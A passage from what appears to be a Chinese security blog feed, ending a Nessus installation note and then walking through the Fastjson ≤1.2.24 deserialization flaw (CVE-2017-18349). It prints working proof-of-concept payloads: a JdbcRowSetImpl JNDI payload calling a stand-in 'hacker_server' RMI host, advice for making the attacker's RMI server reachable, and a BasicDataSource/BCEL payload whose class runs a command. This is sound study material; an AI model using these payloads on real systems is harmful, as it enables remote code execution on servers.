服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start nessusd.service 或 service nessusd start</span><br></pre></td></tr></table></figure><p>​         </p><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htps://localhost:8834/</span><br></pre></td></tr></table></figure><p>会再次出现初始化的页面，这是Nessus在编译和安装插件，这个过程耗时少则几分钟多则两三天，耗子尾汁吧</p><p>​        </p><p>这样就可以使用了，不再限制16个 ip<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/file/nessus11.png"></p><p>​        </p><p>​                                                                 <strong>好了，最后提醒要做守法好公民哦 ！</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近有需要在机器用到漏扫，发现nessus还不错，索性在虚拟机上安装了。安装过程有些要注意的地方，诶我又索性做个笔记。话不多说开干 🛠&lt;/</summary>
      
    
    
    
    <category term="随笔" scheme="https://www.mtrleed.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞学习</title>
    <link href="https://www.mtrleed.top/post/11/"/>
    <id>https://www.mtrleed.top/post/11/</id>
    <published>2022-06-19T16:00:00.000Z</published>
    <updated>2023-06-24T15:03:46.507Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fastjson是一个Java语言编写的高性能功能完善的开源JSON解析库，属于阿里巴巴。用于对JSON格式的数据进行解析和打包，能够支持将java bean序列化成JSON字符串， 也能够将JSON字符串反序列化成Java bean。简单说就是可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象，而且十分简洁。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String text = JSON.toJSONString(obj); <span class="comment">//序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">// 反序列化</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>); <span class="comment">//反序列化，解析为JSONObject类型或者JSONArray类型，JSONArray类型可以想象成多个JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="comment">//反序列化，JSON文本解析成VO.class类</span></span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line">toJSONString()会调用get方法，parseObject() 能同时触发所有的set和get方法，parse()只会调用set方法</span><br><span class="line">如果在get或set方法存入恶意操作，并且通过autoType(@type)进行指定转换利用，最终会造成fastjson 反序列化漏洞</span><br></pre></td></tr></table></figure><h3 id="set和get"><a href="#set和get" class="headerlink" title="set和get"></a>set和get</h3><p>set和get这两个方法是对数据进行设置和获取用的，set方法是初始化和赋值时调用。而且，在类中使用set和get方法时，都是在set和get后面跟上一些特定的词来形成特定意思的方法名，比如setage（）和getage（），表示设置年龄和获取年龄。JAVA中的封闭性和安全性，封闭性即对类中的域变量进行封闭操作，即用private来修饰他们，如此一来其他类则不能对该变量访问。这样我们就将这些变量封闭在了类内部，这样就提高了数据的安全性，当我们想要操作这些域变量怎么办呢？我们可以通过两种方法：<br>第一种即通过public方式的构造器（或称构造函数），对象一实例化就对该变量赋值。<br>第二种就是通过上面提到的set和get方法，举一个特定的例子，定义一个<br>Person类，<br>该类中有name、age这两个私有域变量，<br>定义setname（）、getname（）、setage（）、getage（）这四个方法，<br>通过这四个方法来实现对name和age的操作。这样一来，不用直接对Person类中的域变量操作，而是通过set和get方法间接地操作这些变量，这样就能提高域变量的安全性，同时又保证了域变量的封装型。</p><p>最后说说set和get方法的使用场景，一般来说set和get方法都是对私有域变量进行操作的，所以大多数都是使用在包含特定属性的类实体中。<br>这两个方法只是类中的setxxx和getxxx方法的总称，给他赋值就用u.setXXX();  取这个类的对象的某个值 就get。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;<span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> java.lang.<span class="function">String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(java.lang.String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="fastjson的使用"><a href="#fastjson的使用" class="headerlink" title="fastjson的使用"></a>fastjson的使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在pom.xml中通过配置maven依赖：</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line">然后在需要的类中进行应用，如：</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br></pre></td></tr></table></figure><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>1.有报错回显<br>我们可以以POST方式发送一个不闭合花括号的方式，使网站给我们显示报错包，在回显包中会有json类型的信息<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.jpg"></p><p>​      </p><p>2.无报错回显<br>可使用DNSlog来回显</p><h3 id="CVE-2017-18349-Fastjson-lt-1-2-24反序列化-rce"><a href="#CVE-2017-18349-Fastjson-lt-1-2-24反序列化-rce" class="headerlink" title="(CVE-2017-18349)Fastjson&lt;=1.2.24反序列化-rce"></a>(CVE-2017-18349)Fastjson&lt;=1.2.24反序列化-rce</h3><p>fastjson在解析json的过程中，支持使用autoType也就是<code>@type</code>来实例化某一个具体的类，并调用该类的set/get方法来访问属性，可以使得fastjson支持自省，目的是为了让开发者更加方便的使用Fastjson的一系列功能，只要JSON字符串中包含 @type ，那么 @type 后的属性，就会被当做是 @type 所指定的类的属性，从而在不传递第二个参数的情况下让Fastjson明确要还原的类，但是此功能也是造成漏洞的原因，通过查找代码中相关的类和方法，即可构造出一些恶意利用链。具体漏洞的形成原因是Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时由于没有进行合理检查从而导致用户在构造恶意攻击链并传入，可造成任意命令执行漏洞。</p><p>就比如：<br>JSON.toJSONString(object,SerializerFeature.WriteClassName)这个方法中存在的一个参数<code>SerializerFeature.WriteClassName</code>，它会使序列化后的数据带有<code>@type</code>表明所属的类，在对JSON数据进行反序列化的时候，会去调用指定类中的get/set/is方法。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png"></p><p>所以如果我们在序列化的时候添加了<code>@type</code>参数，是不是可以在反序列化的时候，通过控制<code>@type</code>键的值也就是上面的”Student”来控制该序列化数据要被反序列化成什么样的对象，即调用什么类的set方法。于是我们需要在fastjson中找到一个合适的类，它可以被用来完成我们想要的功能。</p><h4 id="fastjson反序列化过程"><a href="#fastjson反序列化过程" class="headerlink" title="fastjson反序列化过程"></a>fastjson反序列化过程</h4><p>我们先编写一个类，随后使用数据进行反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;<span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String date;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(String date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="comment">//import com.sun.rowset.JdbcRowSetImpl;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*Student student = new Student();//无参构造</span></span><br><span class="line"><span class="comment">        student.setId(1);</span></span><br><span class="line"><span class="comment">        student.setName(&quot;张三&quot;);</span></span><br><span class="line"><span class="comment">        String studentJson = JSON.toJSONString(student, SerializerFeature.WriteClassName);//序列化</span></span><br><span class="line"><span class="comment">        System.out.println(studentJson);*/</span></span><br><span class="line">        String jsonstring =<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Student\&quot;:\&quot;id\&quot;:8,\&quot;name\&quot;:\&quot;mtrleed\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//System.out.println(JSON.parse(jsonstring));</span></span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));<span class="comment">//反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      </p><p>在parseObject这里打个断点，方便待会跟。<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9617.png"></p><p>​       </p><p>前面跟的有点头晕，一路来到scanSymbol()方法，它会读取到@type关键字<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%967.png"></p><p>​      </p><p>然后通过 TypeUtils.loadClass() 方法来加载 Class，优先从 mappings 里面寻找类，mappings 中存放着一些 Java 内置类，在里面查找不到，所以最后用 ClassLoader() 加载类，也就是加载我们的实验类 org.example.Student 类<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%968.png"></p><p>​      </p><p>往下跟会调用 deserialze()方法(反序列化程序)，在反序列化之前先使用getDeserializer() 方法获取反序列化数据<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%969.png"></p><p>接着继续在getDeserializer() 方法往下，这里使用了拒绝列表(黑名单)的方式进行过滤，但是里面只有Thread<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9610.png"></p><p>再往后就是调用get/set方法进行数据的获取和赋值。</p><p>​       </p><p>针对fastjson反序列化，网上师傅们三条常用的这三条链：JdbcRowSetImpl(JdbcRowSetImpl利用链最终的结果是导致 JNDI 注入)、TemplatesImpl（需要开启 Feature.SupportNonPublicField 实战中不适用)、BasicDataSource(系统不出网时使用) 。</p><h4 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h4><p>因为JdbcRowSetImpl利用的最后是造成的JDNI注入，所以首先我们先来了解一些必要的概念。<strong>RMI、JNDI、JRMP协议、LDAP协议</strong>。(可以移步我以往文章)</p><p>JNDI查找远程对象时InitialContext.lookup(URL)的参数URL可以覆盖一些上下文中的属性，比如：Context.PROVIDER_URL。Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，可以进行JNDI注入。也就是说JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。</p><p>JNDI注入（这里指修改JNDI查找远程的对象）：</p><p>JDNI 注入所需要的RMI和LDAP对JDK是有限制的，高版本的JDK不适用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">基于rmi的利用方式：</span><br><span class="line">适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前。 在jdk8u122的时候，加了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line"></span><br><span class="line">基于ldap的利用方式：</span><br><span class="line">适用jdk版本：JDK 6u211，JDK 7u201，JDK 8u191，JDK 11.0.1之前。 在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。 </span><br></pre></td></tr></table></figure><p>可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</p><p>下面开始分析JdbcRowSetImpl链：<br>JdbcRowSetImpl的局限是<strong>必须能出网去加载远端的恶意字节码</strong>，该类是JDK自带的，完整类地址com.sun.rowset.JdbcRowSetImpl 。<br>POC 如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为 RMI 服务中心绑定的 Exploit 服务，autoCommit有且必须为 true 或 false 等布尔值类型：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://hacker_server/xxx&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>瞅瞅这个类:<br>进入JdbcRowSetImpl，找到setDataSourceNmame()：<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png"></p><p>首先判断getDataSourceName()是否为空，若为空则进入else对其进行赋值，将dsName传给它。</p><p>​      </p><p>来到getDataSourceName()方法处查看一下他的返回值<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png"></p><p>getDataSourceName()返回值是字符串类型的dataSource，而我们在反序列化时它是空的，所以表明setDataSourceNmame()会默认自动调用setDataSourceName()为DataSourceName赋值（DataSourceName在connect()中，后面讲）。</p><p>​      </p><p>回到com.sun.rowset.JdbcRowSetImpl类中的com.sun.rowset.JdbcRowSetImpl.setAutocommit()方法：<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%964.png"></p><p>这里有一个重要的方法调用com.sun.rowset.JdbcRowSetImpl.connect()</p><p>​      </p><p>找到com.sun.rowset.JdbcRowSetImpl.connect()<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%965.png"></p><p>connect()方法最终执行了lookup()方法，lookup()方法就是JNDI中访问远程服务器获取远程对象的方法，其参数getDataSourceName()为服务器地址，而getDataSourceName是获取DataSourceName值的方法，我们要是控制了setDataSourceName方法的参数比如设置成自己的VPS，这样就可以访问到自己的服务器了。刚好我们知道Fastjson在反序列化的时候，会自动调用所有的set方法，于是正好可以通过setDataSourceName对DataSourceName进行赋值。</p><p>总的来说这个链原理，FastJson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法。而JDK中的JdbcRowSetImpl类的setAutoCommit()会调用connect()函数，connect()函数又会调用InitialContext.lookup(dataSourceName)，这里的参数dataSourceName是在setter方法setDataSourceName(ds Name)中设置的。所以在FastJson反序列化漏洞过程中，我们是可以控制dataSourceName的值的*，也就是说满足了JNDI注入利用的条件</p><p>lookup()方法是JNDI中访问远程服务器获取远程对象的方法，找到com.sun.jndi.rmi.registry.RegistryContext.lookup()想看看具体实现过程，是怎样lookup的，大概是触发lookup()，加载远程恶意对象,后面decodeObject()方法，加载远程Reference绑定的恶意对象(我看不太懂，但是我大为震撼)<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%966.png"></p><p>好了，com.sun.rowset.JdbcRowSetImpl链到这就结束了。</p><p>！！注意：<br>在本地测试的过程中，POC通常是可以得到结果的，但是进行远程或者不同网络的时候往往会出现请求超时的结果(timeout) ，为什么会出现这种情况呢？<br>有师傅分析，在使用RMI Registry时服务端会使用两个端口服务，一个是监听端口(默认1099)，另一个是远程通信的host和port是由RMI Registry传递给客户端(攻击机)且port是随机分配，host默认值是服务端本地主机名对应的IP地址，大多数情况下是一个内网IP没错了，127.0.1.1。关于127.0.1.1，这个是127.0.0.0/8段下面的一个ip，出现在/etc/hosts文件中的，可以用来解析自己的主机名。</p><p>尝试应对：可以把/etc/hosts中指向内网IP的记录删除或者指向外网IP(服务端也属于你的情况下)，也可以在攻击者的RMI服务端通过代码明确指定远程对象通信Host IP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;java.rmi.server.hostname&quot;,&quot;外网IP&quot;);</span><br></pre></td></tr></table></figure><p>或者在启动RMI服务时，通过启动参数指定 java.rmi.server.hostname 属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.hostname=服务器真实外网IP</span><br></pre></td></tr></table></figure><p>​       </p><h4 id="BasicDataSource利用链"><a href="#BasicDataSource利用链" class="headerlink" title="BasicDataSource利用链"></a>BasicDataSource利用链</h4><p>现实环境多种多样，处于内网不出网的机器也很多，那么如果目标服务器没有外网、无法反连，那就无法使用 JdbcRowSetImpl 利用链 JNDI 注入的方式。那么是否有方法能解决这个不出网的问题呢？显然师傅们已经在前面找到方法了， 下面来看<strong>BasicDataSource</strong>利用链，它是位于Tomcat里的类，如果能成功利用到它，可以在 Payload 中直接传入字节码并且对方机器不需要出网，也不需要开启什么特殊的参数，适用范围一下就开阔了有没有。但是前提是目标要引入tomcat依赖，而且版本不是很高的那种，当然站点一般追求稳定的较低版本，而且不少环境都是有Tomcat的，这也算是相对比较常见的配置了。</p><p>在实验环境中，引入Tomcat</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dbcp&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">6.0</span>.x&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>在不同的版本中，BasicDataSource的位置是有所不同的，它在旧版本的 tomcat-dbcp 包中，完整的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9618.png"></p><p>但是在8.0版本之后完整的路径有所变化org.apache.tomcat.dbcp.dbcp2.BasicDataSource。</p><h5 id="Java的类加载器"><a href="#Java的类加载器" class="headerlink" title="Java的类加载器"></a>Java的类加载器</h5><p>ClassLoader :<br>在Java中，运行它需要经过两次处理，首先编译器将Java源代码转换为Java二进制代码（字节码），生成.class文件，之后通过Java虚拟机（JVM，在jdk下的javac中可以找到）的解释器来执行这段代码。Java字节码中有很多的Class信息，JVM在执行的时候需要用到ClassLoader就来Java类，由ClassLoader将Java字节码中的Class加载到内存中。而每个Class对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。路径：java.base.java.lang.ClassLoader<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9619.png"></p><p>​      </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdk自带常用的类加载器：</span><br><span class="line">BootstrapClassLoader、ExtensionClassLoader、AppClassLoader、URLClassLoader、ContextClassLoader；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加载器常用方法：</span><br><span class="line">loadClass()</span><br><span class="line">findClass()//加载.class文件，找到后调用defineclass()</span><br><span class="line">defineClass()//将字节码转换成java.lang.Class的对象</span><br></pre></td></tr></table></figure><p>另外一个就是 java.lang.class.forname()方法也可以用来动态加载类，而且它默认初始化类，会执行静态代码块 （就是static代码块；官方解释：格式 static{} 特点：需要通过static关键字修饰，随着类的加载而加载，并且自动触发、只执行一次 优先加载 使用场景：在类加载的时候做一些静态数据初始化的操作，以便后续使用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="keyword">boolean</span> initialize, ClassLoader loader) <span class="keyword">throws</span> ClassNotFoundException </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException</span><br></pre></td></tr></table></figure><p>​      </p><h5 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h5><p>BasicDataSource.getConnection() -&gt; BasicDataSource.createDataSource() -&gt; BasicDataSource.createConnectionFactory()<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9620.png"></p><p>可以看到，这条链最终会调用前面提到的加载类的一种方法JDK的Class.forName()，使用的参数driverClassName和driverClassLoader，我们是可以控制这俩参数的，一起来看poc，这是针对目标使用JSON.parse() 方法进行反序列化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POC：</span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,<span class="attr">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;name&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们先来看看com.sun.org.apache.bcel.internal.util.ClassLoader是什么，看名字就知道它是一个类加载器，这是jdk自带的类，它会直接从classname中提取Class的字节码数据。具体是：如果classname中包含$$BCEL$$，该ClassLoader则会将$$BCEL$$后的字符串以BCEL编码进行解码，作为Class的字节码，并调用defineClass()将Class转化为对象<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9621.png"></p><p>poc建议删掉所有空格进行分析，首先json格式为 {“key”: value, “key”: value} 。</p><ol><li>先将 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段放到JSON Value的位置上，之后在外面又套了一层 “{ }”。</li><li>之后又将 Payload 整个放到了JSON 字符串中 Key 的位置上。</li></ol><p>“driverClassName”: “$$BCEL$$$l$8b$I$A$…”，其参数是$$BCEL$$接上我们恶意类的字节码的BCEL编码。例如编写一个实验类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;                                               <span class="comment">//payload写在 static 代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      